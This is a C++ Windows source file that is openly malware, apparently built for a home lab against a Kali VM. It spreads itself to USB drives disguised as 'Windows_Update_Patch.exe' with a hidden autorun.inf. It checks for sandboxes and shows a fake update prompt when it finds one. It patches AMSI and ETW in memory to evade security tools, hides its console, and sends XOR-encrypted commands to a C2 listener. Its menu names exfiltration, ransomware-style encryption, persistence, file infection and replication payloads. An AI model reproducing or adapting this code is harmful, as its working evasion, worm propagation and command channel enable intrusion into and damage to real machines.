#include <iostream>
#include <string>
#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <vector>
#include <thread>
#include <filesystem>
namespace fs = std::filesystem;
#pragma comment(lib, "ws2_32.lib")

using namespace std;

// ======================== CONFIGURATION ========================
// >>> REPLACE THESE WITH YOUR MACHINE'S DETAILS <<<
const char* TARGET_IP = "192.168.18.40";   // <-- CHANGE TO YOUR KALI VM's IP
const int PORT = 8080;                       // <-- CHANGE PORT IF NEEDED
// ===============================================================

// ======================== PROPAGATION: USB SPREAD ========================
void spreadToUSB() {
    char drives[26];
    DWORD len = GetLogicalDriveStringsA(sizeof(drives), drives);

    for (int i = 0; i < len; i += 4) {
        string drive = string(1, drives[i]) + ":\\";
        UINT type = GetDriveTypeA(drive.c_str());

        if (type == DRIVE_REMOVABLE) {
            string destPath = drive + "Windows_Update_Patch.exe";
            if (!fs::exists(destPath)) {
                CopyFileA("host_virus.exe", destPath.c_str(), FALSE);
                SetFileAttributesA(destPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

                ofstream autorun(drive + "autorun.inf");
                autorun << "[AutoRun]\n";
                autorun << "action=Open Windows Update\n";
                autorun << "open=Windows_Update_Patch.exe\n";
                autorun << "shell\\open\\command=Windows_Update_Patch.exe\n";
                autorun << "UseAutoPlay=1\n";
                autorun.close();
                SetFileAttributesA((drive + "autorun.inf").c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            }
        }
    }
}

// ======================== EVASION: TIMING & CHECKPOINT ========================
void sleepWithJitter() {
    srand(GetTickCount());
    int jitter = (rand() % 5000) + 3000;
    Sleep(jitter);
}

bool isSandboxed() {
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2147483648ULL) return true;

    ULARGE_INTEGER freeBytes, totalBytes;
    GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, NULL);
    if (totalBytes.QuadPart < 64424509440ULL) return true;

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return true;

    return false;
}

// ======================== EVASION: AMSI PATCH ========================
void patchAMSI() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;

    LPVOID amsiScanBuffer = (LPVOID)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsiScanBuffer) return;

    DWORD oldProtect;
    VirtualProtect(amsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
    unsigned char patch[] = { 0xB0, 0x00, 0xC3 };
    memcpy(amsiScanBuffer, patch, 3);
    VirtualProtect(amsiScanBuffer, 3, oldProtect, &oldProtect);
}

// ======================== EVASION: ETW BLOCKING ========================
void blockETW() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;

    LPVOID etwEventWrite = (LPVOID)GetProcAddress(ntdll, "EtwEventWrite");
    if (!etwEventWrite) return;

    DWORD oldProtect;
    VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    unsigned char ret = 0xC3;
    memcpy(etwEventWrite, &ret, 1);
}

// ======================== XOR ENCRYPTION ========================
string xorEncryptDecrypt(const string& data, char key) {
    string output = data;
    for (size_t i = 0; i < data.size(); i++) {
        output[i] = data[i] ^ key;
    }
    return output;
}

void sendEncryptedCommand(const string& command) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_addr.s_addr = inet_addr(TARGET_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    if (connect(s, (struct sockaddr*)&server, sizeof(server)) >= 0) {
        string encrypted = xorEncryptDecrypt(command, 'K');
        send(s, encrypted.c_str(), encrypted.size(), 0);
        cout << "[+] Command sent: " << command << endl;
    } else {
        cout << "[-] Failed to connect to " << TARGET_IP << ":" << PORT << endl;
    }
    closesocket(s);
    WSACleanup();
}

// ======================== MAIN C2 LOOP ========================
int main() {
    // Hide console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Anti-sandbox
    if (isSandboxed()) {
        MessageBoxA(NULL, "System update required. Please restart.", "Windows Update", MB_OK);
        return 0;
    }

    // Apply evasion
    patchAMSI();
    blockETW();

    // USB spread in background
    thread usbThread(spreadToUSB);
    usbThread.detach();

    cout << "========================================" << endl;
    cout << "[C2] Connected to Kali VM Listener at " << TARGET_IP << ":" << PORT << endl;
    cout << "[C2] Available commands:" << endl;
    cout << "  websites  - Open 5 random websites on VM (via xdg-open)" << endl;
    cout << "  mouse     - Crazy mouse jitter for 10 seconds (Xdotool/zenity)" << endl;
    cout << "  app       - Launch multiple random apps on VM (gnome/gtk)" << endl;
    cout << "  flash     - Flashing screen colors for 10 seconds (X11 hack)" << endl;
    cout << "  keyboard  - Type a ransom message via keystrokes (xdotool)" << endl;
    cout << "  exfil     - Exfiltrate system data from VM" << endl;
    cout << "  encrypt   - Simulate ransomware (rename files) on VM" << endl;
    cout << "  persist   - Establish persistence on VM (cron, .bashrc)" << endl;
    cout << "  infect    - Infect local files on VM (append marker)" << endl;
    cout << "  replicate - Copy self into every directory on Kali filesystem" << endl;
    cout << "  all       - Run ALL payloads at once" << endl;
    cout << "  exit      - Quit" << endl;
    cout << "========================================" << endl;

    while (true) {
        cout << "\n[C2] Enter command: ";
        string command;
        getline(cin, command);

        if (command == "exit") break;

        sendEncryptedCommand(command);
        sleepWithJitter();
    }

    return 0;
}